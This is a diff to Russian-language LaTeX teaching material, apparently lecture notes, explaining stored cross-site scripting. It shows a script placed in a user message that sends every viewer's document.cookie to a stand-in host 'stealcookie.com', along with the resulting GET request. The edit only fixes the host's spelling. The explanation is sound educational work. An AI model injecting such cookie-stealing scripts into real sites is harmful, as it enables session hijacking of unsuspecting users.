@@ -21,14 +21,14 @@ auth=AJHVML43LDSL42SC6DF;
 Пусть текстовое сообщение, помещенное пользователем, содержит текстовый скрипт, помещающий на странице <<изображение>>, расположенное по некоему адресу.
 \begin{verbatim}
 <script>
-  new Image().src = "http://steelcookie.com?c=" +
+  new Image().src = "http://stealcookie.com?c=" +
     encodeURI(document.cookie);
 </script>
 \end{verbatim}
 
 Тогда браузер всех пользователей, которым показывается сообщение, при загрузке страницы отправит HTTP GET-запрос на получение файла <<изображения>> по адресу
 \begin{center} \begin{verbatim}
-http://steelcookie.com?auth=AJHVML43LDSL42SC6DF;
+http://stealcookie.com?auth=AJHVML43LDSL42SC6DF;
 \end{verbatim} \end{center}
 
 В результате злоумышленник получит cookie, используя который он может заходить на веб-сайт под видом пользователя.
